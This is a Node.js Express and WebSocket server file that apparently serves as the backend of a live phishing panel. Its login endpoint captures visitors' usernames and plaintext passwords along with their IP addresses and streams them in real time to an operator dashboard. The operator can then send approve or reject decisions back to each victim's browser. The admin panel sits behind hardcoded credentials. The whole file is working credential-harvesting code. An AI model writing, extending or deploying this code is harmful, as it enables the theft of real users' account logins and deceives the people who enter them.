const express = require('express');
const path = require('path');
const WebSocket = require('ws');
const http = require('http');
const app = express();
const PORT = process.env.PORT || 5000;
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const activeVisitors = new Map();
const adminSockets = new Set();
const loginAttempts = new Map();
const visitorSockets = new Map();

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

app.post('/api/visitor', (req, res) => {
    const { guid, userAgent } = req.body;
    const ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress;

    const visitor = {
        guid,
        ip,
        userAgent,
        lastSeen: new Date().toISOString(),
        joinTime: activeVisitors.has(guid) ? activeVisitors.get(guid).joinTime : new Date().toISOString()
    };

    activeVisitors.set(guid, visitor);

    madebyerdemirdodevongithub12345BroadcastToAdmins({
        type: 'visitorUpdate',
        visitors: Array.from(activeVisitors.values())
    });

    res.json({ success: true });
});

app.post('/api/login', (req, res) => {
    const { guid, username, password } = req.body;
    const ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress;

    const loginAttempt = {
        guid,
        username,
        password,
        ip,
        timestamp: new Date().toISOString(),
        status: 'pending'
    };

    loginAttempts.set(guid, loginAttempt);

    madebyerdemirdodevongithub12345BroadcastToAdmins({
        type: 'loginAttempt',
        attempt: loginAttempt
    });

    res.json({ success: true, status: 'pending' });
});

app.post('/api/admin/login-decision', requireAdminAuth, (req, res) => {
    const { guid, decision } = req.body;

    if (loginAttempts.has(guid)) {
        const attempt = loginAttempts.get(guid);
        attempt.status = decision;


        broadcastToVisitor(guid, {
            type: 'loginDecision',
            decision: decision
        });


        setTimeout(() => {
            loginAttempts.delete(guid);
            madebyerdemirdodevongithub12345BroadcastToAdmins({
                type: 'loginAttemptsUpdate',
                attempts: Array.from(loginAttempts.values())
            });
        }, 1000);

        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Login attempt not found' });
    }
});

app.get('/api/admin/visitors', requireAdminAuth, (req, res) => {
    res.json({
        totalActive: activeVisitors.size,
        visitors: Array.from(activeVisitors.values()),
        loginAttempts: Array.from(loginAttempts.values())
    });
});

// Passwoword = adminm123 username: admin, you can change it to whatever you want =)
function requireAdminAuth(req, res, next) {
    const auth = req.headers.authorization;

    if (!auth || !auth.startsWith('Basic ')) {
        res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"');
        return res.status(401).send('Authentication required');
    }

    const credentials = Buffer.from(auth.slice(6), 'base64').toString();
    const [username, password] = credentials.split(':');

    if (username === 'admin' && password === 'adminm123') {
        next();
    } else {
        res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"');
        return res.status(401).send('Invalid credentials');
    }
}

app.get('/admin', requireAdminAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

wss.on('connection', (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const isAdmin = url.searchParams.get('admin') === 'true';

    if (isAdmin) {
        adminSockets.add(ws);

        ws.send(JSON.stringify({
            type: 'visitorUpdate',
            visitors: Array.from(activeVisitors.values())
        }));

        ws.on('close', () => {
            adminSockets.delete(ws);
        });
    } else {
        const guid = url.searchParams.get('guid');
        if (guid) {
            visitorSockets.set(guid, ws);

            if (activeVisitors.has(guid)) {
                const visitor = activeVisitors.get(guid);
                visitor.isOnline = true;
                visitor.lastSeen = new Date().toISOString();

                madebyerdemirdodevongithub12345BroadcastToAdmins({
                    type: 'visitorUpdate',
                    visitors: Array.from(activeVisitors.values())
                });
            }
        }

        ws.on('close', () => {
            if (guid) {
                visitorSockets.delete(guid);

                if (activeVisitors.has(guid)) {
                    const visitor = activeVisitors.get(guid);
                    visitor.isOnline = false;
                    visitor.lastSeen = new Date().toISOString();

                    madebyerdemirdodevongithub12345BroadcastToAdmins({
                        type: 'visitorUpdate',
                        visitors: Array.from(activeVisitors.values())
                    });
                }
            }
        });
    }
});

function madebyerdemirdodevongithub12345BroadcastToAdmins(data) {
    adminSockets.forEach(socket => {
        if (socket.readyState === WebSocket.OPEN) {
            socket.send(JSON.stringify(data));
        }
    });
}

function broadcastToVisitor(guid, data) {
    const socket = visitorSockets.get(guid);
    if (socket && socket.readyState === WebSocket.OPEN) {
        socket.send(JSON.stringify(data));
    }
}

setInterval(() => {
    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);

    for (const [guid, visitor] of activeVisitors.entries()) {
        if (new Date(visitor.lastSeen) < fiveMinutesAgo && !visitor.isOnline) {
            activeVisitors.delete(guid);
        }
    }

    madebyerdemirdodevongithub12345BroadcastToAdmins({
        type: 'visitorUpdate',
        visitors: Array.from(activeVisitors.values())
    });
}, 5 * 60 * 1000);

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Running, let's go!`);
});